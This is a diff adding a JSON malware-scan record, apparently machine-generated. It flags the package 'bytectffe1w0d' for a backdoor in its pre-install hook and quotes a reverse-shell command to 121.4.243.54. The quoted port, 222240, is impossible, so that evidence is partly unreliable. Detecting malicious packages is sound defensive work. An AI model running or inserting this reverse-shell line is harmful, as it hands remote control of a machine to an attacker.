@@ -1,0 +1,34 @@
+{
+  "package_name": "bytectffe1w0d",
+  "version": "0.0.1",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "backdoor_installation",
+      "summary": "The package contains a backdoor installation script in the pre-install hook.",
+      "details": "The pre-install hook contains a reverse shell command to a known IP address (121.4.243.54) and port (222240).",
+      "confidence": 0.96,
+      "evidence_commands": [
+        "bash-i>&/dev/tcp/121.4.243.54/222240>&1"
+      ],
+      "evidence_files": [],
+      "evidence_apis": [],
+      "evidence_domains": [],
+      "evidence_env_vars": [],
+      "risk_vector": [
+        "backdoor_installation"
+      ]
+    }
+  ],
+  "risk_vector": [],
+  "analyst_note": "This JSON output indicates that the package has a high level of confidence that it contains a backdoor installation script in the pre-install hook. The details of the malicious action taken by the code are provided in the \"details\" field. The command used in the pre-install hook is \"bash-i>&/dev/tcp/121.4.243.54/222240>&1\", which is a reverse shell command to a known IP address and port. The risk vector indicates that the package is involved in backdoor installation.",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "flag",
+    "structural_risk_score": 1.0,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T22:07:31.548910"
+}
